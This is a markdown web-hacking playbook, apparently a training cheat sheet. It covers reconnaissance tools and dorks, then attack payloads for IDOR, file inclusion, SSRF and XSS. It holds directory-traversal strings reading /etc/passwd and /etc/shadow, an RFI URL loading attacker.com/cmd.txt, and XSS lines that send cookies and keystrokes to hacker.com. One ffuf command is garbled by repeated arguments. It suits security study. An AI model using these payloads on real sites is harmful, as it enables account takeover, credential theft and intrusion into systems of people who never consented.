# High Level Web Hacking Playbook

## OSINT/Research/Recon

1. ***Walking an application***
   * View Source - Use your browser to view the human-readable source code of a website.
   * Inspector - Inspect page elements and make changes to view usually blocked content.
   * Debugger - Inspect and control the flow of a page's JavaScript
   * Network - See all the network requests a page makes using the developer tools.
2. ***Content discovery***
   * Manual Discovery:
      * **robots.txt**
         * Look for points of interest
      * **favicon.ico**
         * Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover. You can then use [OWASP Favicon Database](https://wiki.owasp.org/index.php/OWASP_favicon_database) to find clues on which frameworks are in use.
      * **Sitemap.xml**
         * Look for points of interest
      * **HTTP Headers**
         * Look at the return headers from requests to the site such as the webserver software and possibly the programming/scripting language in use.
      * **Framework Recon**
         * Search for default things based on the framework in use for the following:
            - [ ] admin panels
            - [ ] credentials
            - [ ] server pages
      * **OSINT**
         * *Google Dorking*
            * Search google for the following:
               - [ ] ```site:<somewebsite.com>```
               - [ ] ```inurl:admin```
               - [ ] ```filetype:pdf```
               - [ ] ```intitle:admin```
               - More can be found at: [Google Hacking](https://en.wikipedia.org/wiki/Google_hacking)
         * [*Wappalyzer*](https://www.wappalyzer.com/)
            * Identify what technologies the website uses, such as frameworks, Content Management Systems (CMS), payment processors, version number, etc.
         * [*Wayback Machine*](https://archive.org/web/)
            * Great for research into old pages that may still be active.
         * Github
            * Locate repositories owned by target. Look for passwords, configs, and framework clues.
         * S3 Buckets
            *  The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com 
            * Search common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.
   * Automated Discovery
      * Using wordlists like those from [SecLists](https://github.com/danielmiessler/SecLists) use tools to search for pages, frameworks, etc.
      * **ffuf**: ```ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ```
      * **dirb**: ```dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt```
      * **gobuster**: ```gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt```
3. Subdomain Enumeration
   * SSL/TLS Certificates
      * Get certificate information via [*crt.sh*](https://crt.sh/) or [*ctsearch*](https://ui.ctsearch.entrust.com/ui/ctsearchui)
   * Search Engines
      * Google Dork the following:
         * ```-site:www.domain.com site:*.domain.com```
   * DNS Bruteforce
      * Use [*DNSRecon*](https://www.kali.org/tools/dnsrecon/) to search for DNS information: ```dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml```
   * Sublist3r
      * Enumerate domains with [*Sublist3r*](https://github.com/aboul3la/Sublist3r): ```python sublist3r.py -d example.com```
   * Non public DNS search
      * **ffuff**: ```ffuf -w ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.com" -u http://MACHINE_IP -H "Host: FUZZ.acmeitsupport.com" -u http://MACHINE_IP -fs {size}```
         * Use fs to filter out packets via size to refine results

## Active Hacking

### IDOR - Insecure Direct Object Reference / Enumeration
Investigate IDOR objects and reference numbers

   * **Quick Reference IDOR/Enumeration Ideas**
      * Try negative numbers and symbols such as : ```-1``` or ```*```
      
* **IDOR Automation**
   * [**IDOR Hunter**](https://github.com/SKHTW/IDOR_Scanner)

### File Inclusion
Search for LFI (Local File Inclusion), RFI (Remote File inclusion), and directory traversal

* **LFI**
   * LFI can potentially be explouted when endpoints like ```http://webapp.com/index.php?lang=EN``` exist. 
   * **Notes**:
      * Using null bytes is an injection technique where URL-encoded representation such as ```%00``` or ```0x00``` in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
   
   * Investigate paths like:
      * ```/page1.php?file=/etc/passwd```
      * ```/lab3.php?file=../../../../etc/passwd%00```
* **RFI**
   * ```http://webapp.com/index.php?lang=http://attacker.com/cmd.txt```

* **Directory Traversal**
   * ```http://webapp.com/get.php?file=../../../../etc/passwd```
   * ```http://webapp.com/get.php?file=../../../../etc/shadow```

   * ```http://webapp.com/get.php?file=../../../../boot.ini```
   * ```http://webapp.com/get.php?file=../../../../windows/win.ini```

## SSRF - Server-Side Request Forgery
There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.

* **Directory Traversal**
   * ```http://webapp.com/stock?url=/../user```
   * ```http://webapp.com/stock?server=api.webapp.com/api/user/&x=&id=123```
      * **Note** the payload ending in ```&x=``` being used to stop the remaining path from being appended to the end  of the attackers url, and instead turns it into a parameter.
   * ```http://webapp.com/stock?url=http://hacker-domain.com/```

## XSS - Cross-Site Scripting
* PoC
   * ```<script>alert('XSS');</script>```
* Session Stealing
   * ```<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>```
* Key Logger
   * ```<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>```
* Business Logic / Function Call
   * ```<script>user.changeEmail('attacker@hacker.com');</script>```

* **Reflected XSS**
   * You'll need to test every possible point of entry; these include:

      * Parameters in the URL Query String
      * URL File Path
      * Sometimes HTTP Headers (although unlikely exploitable in practice)
* **Stored XSS**
   * The XSS must be stored in something like the websites DB
   * You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
      * Comments on a blog
      * User profile information
      * Website Listings